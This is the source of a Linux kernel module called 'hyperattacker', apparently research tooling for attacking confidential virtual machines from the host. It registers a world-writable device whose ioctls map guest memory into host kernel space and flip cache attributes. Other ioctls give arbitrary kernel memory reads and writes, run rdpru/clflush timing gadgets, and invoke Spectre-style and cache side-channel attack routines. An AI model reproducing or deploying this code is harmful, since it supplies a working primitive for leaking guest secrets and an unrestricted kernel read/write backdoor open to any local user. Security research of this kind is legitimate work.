#include <linux/init.h>
#include <linux/kthread.h>
#include <asm/tlbflush.h>
#include <linux/module.h>
#include <linux/kvm_host.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/nmi.h>
#include "main.h"
#include "utils/translation.h"
#include "utils/attack.h"

static int hyperattacker_open(struct inode *inode, struct file *file);
static int hyperattacker_release(struct inode *inode, struct file *file);
static long hyperattacker_ioctl(struct file *file, unsigned int cmd, unsigned long arg);

static const struct file_operations hyperattacker_fops = {
    .owner      = THIS_MODULE,
    .open       = hyperattacker_open,
    .release    = hyperattacker_release,
    .unlocked_ioctl = hyperattacker_ioctl
};

extern u64 kvm_arch_dev_ioctl_get_ncr3(void);

static DEFINE_SPINLOCK(my_spinlock);

static int dev_major = 0;
static struct class *hyperattacker_class = NULL;
struct cdev cdev;

static int hyperattacker_uevent(struct device *dev, struct kobj_uevent_env *env)
{
    add_uevent_var(env, "DEVMODE=%#o", 0666);
    return 0;
}

static int __init hyperattacker_init(void)
{
	dev_t dev;
	if(alloc_chrdev_region(&dev, 0, 1, "hyperattacker") != 0){
		printk("alloc_chrdev_region failed.\n");
		return -EFAULT;
	}
	dev_major = MAJOR(dev);
	hyperattacker_class = class_create(THIS_MODULE, "hyperattacker");
	hyperattacker_class->dev_uevent = (void*)hyperattacker_uevent;

    cdev_init(&cdev, &hyperattacker_fops);
	cdev.owner = THIS_MODULE;

	cdev_add(&cdev, MKDEV(dev_major, 0), 1);

	device_create(hyperattacker_class, NULL, MKDEV(dev_major, 0), NULL, "hyperattacker");

	return 0;
}

static void __exit hyperattacker_exit(void)
{
    device_destroy(hyperattacker_class, MKDEV(dev_major, 0));

	class_unregister(hyperattacker_class);
	class_destroy(hyperattacker_class);

	unregister_chrdev_region(MKDEV(dev_major, 0), MINORMASK);
}

static int hyperattacker_open(struct inode *inode, struct file *file)
{
    return 0;
}

static int hyperattacker_release(struct inode *inode, struct file *file)
{
    return 0;
}

static long hyperattacker_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    long ret = 0;
    switch(cmd){
	case GET_KERNEL_PTR_SPECTRE_SNP :{
		u64 guest_cr3 = kvm_arch_dev_ioctl_get_ncr3();
		struct kernel_ptr_spectre_request req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
   		}
		u64 spas[256] = {0};
		u64 base = 0;
		for(int j = 0; j < 256; j++){
			spas[j] = gpa2spa(guest_cr3 & HOST_PHYSICAL_ADRS_MASK & ENTRY_ADRS_MASK, req.gpa + (j * 4096));
			if(base == 0 || spas[j] < base){
				base = spas[j];
			}
		}
		u64 cr3_value;
		asm volatile ("mov %%cr3, %0" : "=r" (cr3_value));
		for(int j = 0; j < 256; j++){
			set_mapping(cr3_value & HOST_PHYSICAL_ADRS_MASK & ENTRY_ADRS_MASK, (u64)__va(base + (j * 4096)), ((spas[j] >> 12) << 12));
		}
		req.ptr = (u64)__va(base);
    	if (copy_to_user((void*)arg, &req, sizeof(req))) {
       		return -EFAULT;
   		}
		__flush_tlb_all();
 		break;
	}
	case GET_KERNEL_PTR_SNP :{
		u64 guest_cr3 = kvm_arch_dev_ioctl_get_ncr3();
		struct kernel_ptr_request req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
   		}
		req.ptr = gpa2sva_set_mapping(guest_cr3 & HOST_PHYSICAL_ADRS_MASK & ENTRY_ADRS_MASK, req.gpa);
		if(req.ptr == -1){
			ret = -1;
		}
    	if (copy_to_user((void*)arg, &req, sizeof(req))) {
       		return -EFAULT;
   		}
		__flush_tlb_all();
 		break;
	}
	case SET_UC :{
		struct kernel_ptr_request req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
   		}
		u64 host_cr3;
		asm volatile("movq %%cr3, %%rax\n" :"=a" (host_cr3)::);
		req.ptr = set_uc(host_cr3, req.ptr);
		if(req.ptr == -1){
			ret = -1;
		}
    	if (copy_to_user((void*)arg, &req, sizeof(req))) {
        	return -EFAULT;
    	}
		__flush_tlb_all();
		asm volatile("clflush (%%rbx) \n" ::"b"(req.ptr):);
 		break;
	}
	case SET_C :{
		struct kernel_ptr_request req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
   		}
		u64 host_cr3;
		asm volatile("movq %%cr3, %%rax\n" :"=a" (host_cr3)::);
		req.ptr = set_c(host_cr3, req.ptr);
		if(req.ptr == -1){
			ret = -1;
		}
    	if (copy_to_user((void*)arg, &req, sizeof(req))) {
       		return -EFAULT;
    	}
		__flush_tlb_all();
		asm volatile("clflush (%%rbx) \n" ::"b"(req.ptr):);
 		break;
	}
	case GET_KERNEL_PTR :{
		u64 guest_cr3 = kvm_arch_dev_ioctl_get_ncr3();
		struct kernel_ptr_request req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
    	}
		req.ptr = gpa2sva(guest_cr3, req.gpa);
		if(req.ptr == -1){
			ret = -1;
		}
    	if (copy_to_user((void*)arg, &req, sizeof(req))) {
       		return -EFAULT;
    	}
		__flush_tlb_all();
 		break;
	}
	case ATTACK_WITH_TRIGGER :{
		struct attack_request req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
    	}
		spin_lock_irq(&my_spinlock);
		req.ret = rrmb((char*)req.addr, (char*)req.trigger, req.number);
		spin_unlock_irq(&my_spinlock);
    	if (copy_to_user((void*)arg, &req, sizeof(req))) {
       		return -EFAULT;
   		}
 		break;
		}
	case SAMPLES_COPY_TO_USER :{
		struct sample_request req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
   		}
		samples_copy_to_user(req.addr, req.number);
 		break;
		}
	case WRITE_VALUE:{
		struct write_var_request req;
    	if (copy_from_user(&req, (void*)arg, sizeof(struct write_var_request))) {
       		return -EFAULT;
   		}
		*(u64*)(req.adrs) = req.var;
 		break;
	}
	case READ_VALUE :{
		u64 req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
    	}
		req = *(u64*)req;
    	if (copy_to_user((void*)arg, &req, sizeof(req))) {
       		return -EFAULT;
    	}
 		break;
   	}
	case FLUSH:{
		u64 req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
   		}
		asm __volatile__ (
			"clflush (%0) 				\n"
			"mfence 					\n"
			:
			: "r"((char*)req)
			:);
 		break;
    }
	case GADGET:{
		struct gadget_request req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
   		}
		asm __volatile__ (
    	    "movl $1, %%ecx      		\n"
        	"mfence     				\n"
        	"lfence     				\n"
			"rdpru						\n"
        	"lfence     				\n"
        	"movl %%eax, %%esi      	\n"
        	"movq (%%rbx), %%rax     	\n"
        	"lfence     				\n"
			"rdpru						\n"
        	"subl %%esi, %%eax      	\n"
			: "=a" (req.latency)
			: "b"(req.addr)
			: "%ecx", "%edx", "%esi");
    	if (copy_to_user((void*)arg, &req, sizeof(req))) {
       		return -EFAULT;
    	}
 		break;
    }
	case MONITOR_SPECTRE :{
		struct attack_request_monitor_spectre req;
    	if (copy_from_user(&req, (void*)arg, sizeof(req))) {
       		return -EFAULT;
    	}
		spin_lock_irq(&my_spinlock);
		rrfs_spectre(req.adrs, req.trigger_ptr, &req.result);
		spin_unlock_irq(&my_spinlock);
    	if (copy_to_user((void*)arg, &req, sizeof(req))) {
       		return -EFAULT;
    	}
 		break;
		}
	}
    return ret;
}
MODULE_LICENSE("GPL");


module_init(hyperattacker_init);
module_exit(hyperattacker_exit);
